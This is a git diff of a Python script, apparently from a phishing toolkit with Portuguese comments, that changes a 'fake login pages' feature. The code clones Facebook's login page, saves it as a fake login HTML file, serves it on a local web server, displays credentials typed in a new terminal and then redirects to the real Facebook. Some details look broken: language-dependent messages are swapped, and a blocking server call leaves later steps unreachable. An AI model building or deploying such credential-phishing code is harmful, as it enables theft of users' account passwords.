@@ -4,10 +4,10 @@ import requests
 import time
 import threading
 import http.server
+import socketserver
 import webbrowser
 import numbers
 import numlookupapi
-import socketserver
 from colorama import init, Fore, Style
 
 # Porta para o servidor HTTP local
@@ -15,6 +15,12 @@ PORT = 8000
 
 # Diretório onde os arquivos HTML e CSS serão armazenados
 HTML_CSS_DIR = 'html_css'
+
+# URL da página alvo para clonagem
+TARGET_URL = "https://facebook.com/login.php"
+
+# Variável para verificar se a página já foi clonada
+page_cloned = False
 
 # Função para limpar a tela do console
 def clear_console():
@@ -239,45 +245,46 @@ def phishing_menu(language):
 
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
+    global page_cloned
+
     clear_console()
     if language == '1':
         print("Cloning Facebook for fake login...")
     else:
         print("Clonando Facebook para login falso...")
 
-    # URL da página alvo para clonagem
-    target_url = "https://facebook.com/login.php"
-
     try:
-        # Criar o diretório HTML_CSS_DIR se não existir
-        if not os.path.exists(HTML_CSS_DIR):
-            os.makedirs(HTML_CSS_DIR)
+        if not page_cloned:
+            # Baixar HTML e CSS da página alvo
+            response = requests.get(TARGET_URL)
+            if response.status_code == 200:
+                html_content = response.text
+                # Salvar HTML localmente
+                with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
+                    f.write(html_content)
+                print("Página clonada com sucesso!")
+                page_cloned = True
 
-        # Baixar HTML e CSS da página alvo
-        response = requests.get(target_url)
-        if response.status_code == 200:
-            html_content = response.text
-            # Extrair o nome da página da URL
-            page_name = target_url.split('/')[-1]
-            # Salvar HTML localmente com o nome da página
-            with open(os.path.join(HTML_CSS_DIR, f'{page_name}.html'), 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            print("Página clonada com sucesso!")
+                # Iniciar servidor HTTP local para servir a página clonada
+                start_http_server(language)
 
-            # Iniciar servidor HTTP local para servir a página clonada
-            start_http_server()
+                # Simular mensagem de credenciais digitadas em um novo terminal
+                open_new_terminal(language)
 
-            # Simular mensagem de credenciais digitadas em um novo terminal
-            open_new_terminal(language)
-
-            # Redirecionar para a página oficial do Facebook após simulação
-            print("Redirecting to official Facebook page...")
-            time.sleep(3)  # Simulando redirecionamento
-            webbrowser.open("https://facebook.com")
-
-            input("\nPressione Enter para continuar...")
+                # Redirecionar para a página oficial do Facebook após simulação
+                print("Redirecting to official Facebook page...")
+                time.sleep(3)  # Simulando redirecionamento
+                webbrowser.open("https://facebook.com")
+                input("\nPressione Enter para continuar...")
+            else:
+                print(Fore.RED + "Erro ao clonar página: HTTP status code", response.status_code)
         else:
-            print(Fore.RED + "Erro ao clonar página: HTTP status code", response.status_code)
+            # Página já clonada, mensagem de aviso
+            if language == '1':
+                print("Fake login page already cloned.")
+            else:
+                print("Página de login falso já clonada.")
+            input("\nPressione Enter para continuar...")
 
     except Exception as e:
         print(Fore.RED + f"Erro ao clonar página: {e}")
@@ -285,18 +292,25 @@ def fake_login_pages(language):
     input("\nPressione Enter para continuar...")
 
 # Função para iniciar o servidor HTTP local
-def start_http_server():
-    # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
-    os.chdir(HTML_CSS_DIR)
-    Handler = http.server.SimpleHTTPRequestHandler
+def start_http_server(language):
+    try:
+        # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
+        os.chdir(HTML_CSS_DIR)
+        Handler = http.server.SimpleHTTPRequestHandler
 
-    with socketserver.TCPServer(("", PORT), Handler) as httpd:
-        print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
-        print("Pressione Ctrl+C para encerrar o servidor.")
-        try:
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            pass
+        with socketserver.TCPServer(("", PORT), Handler) as httpd:
+            if language == '1':
+                print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
+                print("Pressione Ctrl+C para encerrar o servidor.")
+            else:
+                print(Fore.GREEN + f"Local HTTP server started at http://localhost:{PORT}")
+                print("Press Ctrl+C to terminate the server.")
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                pass
+    except Exception as e:
+        print(Fore.RED + f"Erro ao iniciar servidor HTTP local: {e}")
 
 # Função para exibir as credenciais digitadas em um novo terminal
 def open_new_terminal(language):
